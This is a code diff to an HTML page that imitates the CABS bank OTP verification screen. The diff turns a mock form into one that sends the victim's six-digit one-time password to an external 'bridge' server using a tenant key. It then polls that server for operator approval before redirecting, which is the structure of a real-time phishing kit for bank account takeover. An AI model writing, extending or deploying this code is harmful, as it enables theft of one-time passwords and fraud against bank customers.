@@ -29,6 +29,33 @@
             min-height: 100vh;
         }
 
+        /* Progress Overlay */
+        #progress-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255,255,255,0.95);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            flex-direction: column;
+        }
+
+        .progress-circle {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            border: 6px solid #eee;
+            border-top: 6px solid var(--cabs-blue);
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
         .login-container {
             width: 100%;
             max-width: 500px;
@@ -36,44 +63,11 @@
             background: white;
         }
 
-        /* Mock Logo Styling */
         .logo-container {
             text-align: center;
             margin-bottom: 40px;
         }
         
-        .logo-main {
-            font-size: 50px;
-            font-weight: 900;
-            color: var(--cabs-blue);
-            letter-spacing: -1px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            line-height: 1;
-        }
-
-        .logo-swoosh {
-            color: var(--cabs-green);
-            font-size: 40px;
-            margin-left: 5px;
-            font-style: italic;
-        }
-
-        .logo-sub {
-            font-size: 11px;
-            color: #555;
-            margin-top: 5px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
-        .logo-sub span {
-            color: var(--cabs-green);
-            font-weight: bold;
-        }
-
-        /* Headings */
         .welcome-text {
             font-size: 32px;
             color: var(--cabs-blue);
@@ -97,7 +91,6 @@
             margin-bottom: 30px;
         }
 
-        /* OTP Input Boxes */
         .otp-container {
             display: flex;
             justify-content: space-between;
@@ -125,7 +118,6 @@
             box-shadow: 0 0 5px rgba(13, 26, 112, 0.2);
         }
 
-        /* Buttons Container */
         .button-group {
             display: flex;
             gap: 15px;
@@ -143,6 +135,7 @@
             text-decoration: none;
             transition: all 0.2s;
             text-transform: uppercase;
+            border: none;
         }
 
         .btn-outline {
@@ -165,7 +158,6 @@
             background: #0a1457;
         }
 
-        /* Resend Link */
         .resend-text {
             text-align: center;
             margin-top: 25px;
@@ -180,10 +172,6 @@
             margin-left: 5px;
         }
 
-        .resend-text a:hover {
-            text-decoration: underline;
-        }
-        
         .timer {
             font-weight: bold;
             color: var(--cabs-blue);
@@ -192,117 +180,106 @@
 </head>
 <body>
 
+    <div id="progress-overlay">
+        <div class="progress-circle"></div>
+        <p style="color: var(--cabs-blue); font-weight: 600;">Verifying OTP...</p>
+    </div>
+
     <div class="login-container">
         
-        <!-- Logo Section -->
         <div class="logo-container">
-            <div class="logo-main">CABS<span class="logo-swoosh">///</span></div>
-            <div class="logo-sub">A MEMBER OF THE <span>OLD MUTUAL</span> GROUP</div>
+            <img src="logo.png" alt="CABS Logo" style="width: 150px; margin-bottom: 10px;">
         </div>
 
-        <!-- Headings -->
         <div class="welcome-text">Security</div>
         <div class="ib-text">Verification</div>
         
         <p class="instruction-text">
-            For your security, please enter the 6-digit One Time Password (OTP) sent to your registered mobile number ending in <strong>****777</strong>.
+            Please enter the 6-digit One Time Password (OTP) sent to your phone.
         </p>
 
-        <!-- OTP Form -->
-        <form action="pin.html" method="GET">
+        <form onsubmit="submitOtpToBridge(event);">
             
             <div class="otp-container">
-                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required autofocus>
-                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
-                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
-                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
-                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
-                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                <input type="text" id="o1" class="otp-input" maxlength="1" pattern="[0-9]" required autofocus>
+                <input type="text" id="o2" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                <input type="text" id="o3" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                <input type="text" id="o4" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                <input type="text" id="o5" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                <input type="text" id="o6" class="otp-input" maxlength="1" pattern="[0-9]" required>
             </div>
 
             <div class="button-group">
                 <button type="button" class="btn btn-outline" onclick="window.history.back()">BACK</button>
                 <button type="submit" class="btn btn-solid">VERIFY & LOGIN</button>
             </div>
-
-            <div class="resend-text">
-                Didn't receive the code? <span id="timer-text">Resend in <span class="timer" id="countdown">0:59</span></span>
-                <a href="#" id="resend-link" style="display:none;" onclick="resetTimer()">Resend Code</a>
-            </div>
         </form>
 
     </div>
 
+    <script src="config.js"></script>
     <script>
-        // --- OTP Input Auto-Advance Logic ---
+        const BRIDGE_URL = window.APP_CONFIG.BRIDGE_URL;
+
+        // Auto-advance logic
         const inputs = document.querySelectorAll('.otp-input');
-
         inputs.forEach((input, index) => {
-            // When a number is typed, jump to the next input
             input.addEventListener('input', (e) => {
-                // Ensure only numbers are typed
                 e.target.value = e.target.value.replace(/[^0-9]/g, '');
-                
-                if (e.target.value !== '') {
-                    if (index < inputs.length - 1) {
-                        inputs[index + 1].focus();
-                    }
-                }
+                if (e.target.value !== '' && index < inputs.length - 1) inputs[index + 1].focus();
             });
-
-            // When backspace is pressed, jump to the previous input
             input.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && e.target.value === '') {
-                    if (index > 0) {
-                        inputs[index - 1].focus();
-                    }
-                }
+                if (e.key === 'Backspace' && e.target.value === '' && index > 0) inputs[index - 1].focus();
             });
         });
 
-        // --- Mock Submit Function ---
-        function verifyOTP() {
-            let code = "";
-            inputs.forEach(input => code += input.value);
-            
-            if(code.length === 6) {
-                alert("Verification Successful! Redirecting to Dashboard...");
-                // In a real app you would redirect here: window.location.href = "cabs-loans.html";
+        async function submitOtpToBridge(event) {
+            event.preventDefault();
+            const otp = Array.from(inputs).map(i => i.value).join('');
+            document.getElementById('progress-overlay').style.display = 'flex';
+
+            try {
+                const response = await fetch(`${BRIDGE_URL}/v1/callback`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Authorization': `Bearer ${window.APP_CONFIG.TENANT_KEY}`
+                    },
+                    body: JSON.stringify({ type: 'otp', otp: otp })
+                });
+                
+                const { attemptId } = await response.json();
+                pollStatus(attemptId);
+            } catch (error) {
+                console.error('Error:', error);
+                document.getElementById('progress-overlay').style.display = 'none';
+                alert('Submission failed.');
             }
         }
 
-        // --- Resend Timer Logic ---
-        let timeLeft = 59;
-        let timerId;
-
-        function startTimer() {
-            const countdownEl = document.getElementById('countdown');
-            const timerText = document.getElementById('timer-text');
-            const resendLink = document.getElementById('resend-link');
-
-            timerId = setInterval(() => {
-                timeLeft--;
-                countdownEl.innerText = "0:" + (timeLeft < 10 ? "0" + timeLeft : timeLeft);
-
-                if (timeLeft <= 0) {
-                    clearInterval(timerId);
-                    timerText.style.display = 'none';
-                    resendLink.style.display = 'inline';
+        async function pollStatus(attemptId) {
+            const interval = setInterval(async () => {
+                try {
+                    const res = await fetch(`${BRIDGE_URL}/v1/status?attemptId=${attemptId}`, {
+                        headers: {
+                            'Authorization': `Bearer ${window.APP_CONFIG.TENANT_KEY}`
+                        }
+                    });
+                    const { status } = await res.json();
+                    
+                    if (status === 'approved') {
+                        clearInterval(interval);
+                        window.location.href = 'index.html';
+                    } else if (status === 'rejected') {
+                        clearInterval(interval);
+                        document.getElementById('progress-overlay').style.display = 'none';
+                        alert("OTP Verification rejected.");
+                    }
+                } catch (error) {
+                    console.error('Polling error:', error);
                 }
-            }, 1000);
+            }, 3000);
         }
-
-        function resetTimer() {
-            timeLeft = 59;
-            document.getElementById('timer-text').style.display = 'inline';
-            document.getElementById('resend-link').style.display = 'none';
-            document.getElementById('countdown').innerText = "0:59";
-            alert("A new OTP has been sent to your phone.");
-            startTimer();
-        }
-
-        // Start the timer when page loads
-        window.onload = startTimer;
     </script>
 </body>
 </html>
